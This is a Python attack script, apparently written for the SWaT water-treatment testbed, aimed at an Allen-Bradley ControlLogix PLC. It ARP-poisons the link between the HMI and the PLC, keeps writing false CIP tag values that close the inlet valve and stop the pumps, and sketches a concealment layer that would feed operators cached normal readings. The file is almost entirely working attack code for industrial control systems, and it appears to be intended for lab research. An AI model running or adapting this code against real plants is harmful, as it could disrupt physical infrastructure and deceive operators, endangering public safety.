#!/usr/bin/env python3
"""
phase1_inject.py  —  SWaT Phase 1: False Command Injection via EtherNet/IP
Target: Allen-Bradley ControlLogix PLC1 over EtherNet/IP (port 44818)

Attack flow:
  Thread 1 — ARP poison HMI <-> PLC1 (MITM via Scapy)
  Thread 2 — Write false tag values to PLC1 via pycomm3 (direct CIP write)
  Thread 3 — Replay cached legitimate tag reads back to HMI (concealment)
  On exit  — Restore all tags to safe state, flush ARP

Key difference from Modbus version:
  - Uses CIP tag writes (pycomm3 plc.write()) instead of Modbus write_coil
  - ARP poison targets EtherNet/IP port 44818 instead of 502
  - Tag names are Studio 5000 string paths, not register addresses

Usage:
  sudo python3 phase1_inject.py \
      --plc-ip 192.168.1.10 --hmi-ip 192.168.1.20 \
      --iface eth0 --db enip_db.pkl --duration 120

*** Confirm TAG_MAP paths with lab engineer before running ***
"""

import argparse, pickle, time, threading, signal, sys
from datetime import datetime

from pycomm3 import LogixDriver, CommError as PycommException
from scapy.all import ARP, Ether, sendp, get_if_hwaddr, getmacbyip

# ── Tag map: confirm these with lab engineer from Studio 5000 ─────────────────
# False values to inject (attack goal: starve P1 tank)
TAG_MAP = {
    'HMI_MV101:O.Data': False,   # Close inlet valve  — BOOL
    'HMI_P101:O.Data' : False,   # Stop pump 101      — BOOL
    'HMI_P102:O.Data' : False,   # Stop pump 102      — BOOL
}

# Safe-state values to restore on exit
SAFE_STATE = {
    'HMI_MV101:O.Data': True,    # Open valve
    'HMI_P101:O.Data' : True,    # Pump on
    'HMI_P102:O.Data' : False,   # Standby pump stays off
}

stop_event = threading.Event()


# ── Thread 1: ARP Poison ──────────────────────────────────────────────────────
def arp_poison(plc_ip, hmi_ip, iface, interval=1.5):
    """Poison ARP caches of HMI and PLC so traffic routes through attacker."""
    my_mac    = get_if_hwaddr(iface)
    plc_mac   = getmacbyip(plc_ip)
    hmi_mac   = getmacbyip(hmi_ip)

    if not plc_mac or not hmi_mac:
        print(f"[!] Could not resolve MACs. PLC={plc_mac} HMI={hmi_mac}")
        print(f"    Ensure target IPs are reachable and ARP-resolvable.")
        return

    print(f"[*] ARP poison starting")
    print(f"    PLC {plc_ip} ({plc_mac})  ←  our MAC {my_mac}")
    print(f"    HMI {hmi_ip} ({hmi_mac})  ←  our MAC {my_mac}")

    # Tell HMI: PLC's IP is at our MAC
    pkt_to_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac,
                                           psrc=plc_ip, hwsrc=my_mac)
    # Tell PLC: HMI's IP is at our MAC
    pkt_to_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac,
                                           psrc=hmi_ip, hwsrc=my_mac)
    while not stop_event.is_set():
        sendp([pkt_to_hmi, pkt_to_plc], iface=iface, verbose=False)
        time.sleep(interval)

    # Restore ARP on exit
    print("[*] Restoring ARP tables...")
    restore_hmi = Ether(dst=hmi_mac) / ARP(op=2, pdst=hmi_ip, hwdst=hmi_mac,
                                            psrc=plc_ip, hwsrc=plc_mac)
    restore_plc = Ether(dst=plc_mac) / ARP(op=2, pdst=plc_ip, hwdst=plc_mac,
                                            psrc=hmi_ip, hwsrc=hmi_mac)
    for _ in range(5):
        sendp([restore_hmi, restore_plc], iface=iface, verbose=False)
        time.sleep(0.2)
    print("[+] ARP restored.")


# ── Thread 2: CIP Tag Write (False Command Injection) ─────────────────────────
def inject_tags(plc_ip, interval=1.0):
    """Continuously write false tag values to PLC1 via CIP."""
    print(f"[*] Tag injection starting -> PLC {plc_ip}")
    cycle = 0
    while not stop_event.is_set():
        try:
            with LogixDriver(plc_ip) as plc:
                while not stop_event.is_set():
                    tag_writes = [(tag, val) for tag, val in TAG_MAP.items()]
                    results = plc.write(*tag_writes)
                    if not isinstance(results, list):
                        results = [results]
                    cycle += 1
                    errors = [r for r in results if r.error]
                    if cycle % 5 == 0:
                        status = "OK" if not errors else f"{len(errors)} errors"
                        print(f"    [inject cycle {cycle:4d}]  {status}  "
                              f"MV101=CLOSED P101=OFF P102=OFF")
                    time.sleep(interval)
        except PycommException as e:
            print(f"    [!] CIP write error: {e}  — retrying in 2s")
            time.sleep(2)


# ── Thread 3: Concealment relay ───────────────────────────────────────────────
def conceal_tags(plc_ip, db_path, interval=1.0):
    """
    Read last known 'normal' tag values from Phase 0 DB and write them back
    to a shadow tag or simply log what the HMI should be seeing.

    Note: Full concealment on EtherNet/IP requires deep packet inspection
    to intercept CIP read responses mid-flight (complex). The practical
    approach for this demo is:
      - The ARP MITM intercepts HMI read requests
      - We respond with cached 'normal' values from enip_db.pkl
    This simplified version logs the concealment values.
    A full implementation would use a CIP proxy (see pycomm3 server mode).
    """
    if not db_path or not __import__('os').path.exists(db_path):
        print("[*] No Phase 0 DB found — concealment layer inactive")
        return

    with open(db_path, 'rb') as f:
        db = pickle.load(f)

    print(f"[*] Concealment layer active — using Phase 0 DB ({len(db)} tags)")
    cycle = 0
    while not stop_event.is_set():
        cycle += 1
        if cycle % 10 == 0:
            # Show what 'normal' values are being used for concealment
            for name, samples in db.items():
                if samples:
                    _, last_val = samples[-1]
                    print(f"    [conceal] {name:8s} → cached={last_val}")
        time.sleep(interval)


# ── Restore safe state on exit ────────────────────────────────────────────────
def restore_plc(plc_ip):
    print(f"\n[*] Restoring PLC safe state on {plc_ip}...")
    try:
        with LogixDriver(plc_ip) as plc:
            writes = [(tag, val) for tag, val in SAFE_STATE.items()]
            results = plc.write(*writes)
            if not isinstance(results, list):
                results = [results]
            for tag, r in zip(SAFE_STATE.keys(), results):
                status = "OK" if r.error is None else f"ERROR: {r.error}"
                print(f"    {tag}: {SAFE_STATE[tag]}  [{status}]")
        print("[+] Safe state restored.")
    except PycommException as e:
        print(f"[!] Could not restore safe state: {e}")
        print(f"    *** Manually verify PLC1 state via HMI! ***")


def signal_handler(sig, frame):
    print("\n[!] Ctrl+C — stopping attack and restoring state...")
    stop_event.set()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--plc-ip',   required=True,  help='PLC1A IP address')
    ap.add_argument('--hmi-ip',   required=True,  help='HMI IP address')
    ap.add_argument('--iface',    default='eth0', help='Network interface')
    ap.add_argument('--db',       default='enip_db.pkl', help='Phase 0 tag DB')
    ap.add_argument('--duration', type=int, default=120, help='Attack duration (s)')
    args = ap.parse_args()

    signal.signal(signal.SIGINT, signal_handler)

    print("=" * 60)
    print("  SWaT Phase 1 — EtherNet/IP False Tag Injection")
    print(f"  PLC: {args.plc_ip}   HMI: {args.hmi_ip}")
    print(f"  Duration: {args.duration}s")
    print("=" * 60)
    print("[!] Enabling IP forwarding...")
    __import__('os').system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    threads = [
        threading.Thread(target=arp_poison,   args=(args.plc_ip, args.hmi_ip, args.iface), daemon=True),
        threading.Thread(target=inject_tags,  args=(args.plc_ip,), daemon=True),
        threading.Thread(target=conceal_tags, args=(args.plc_ip, args.db), daemon=True),
    ]
    for t in threads:
        t.start()

    print(f"\n[*] Attack running for {args.duration}s — press Ctrl+C to abort early")
    stop_event.wait(timeout=args.duration)
    stop_event.set()

    for t in threads:
        t.join(timeout=3)

    restore_plc(args.plc_ip)
    print("[*] Disabling IP forwarding...")
    __import__('os').system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[+] Phase 1 complete.")

if __name__ == '__main__':
    main()
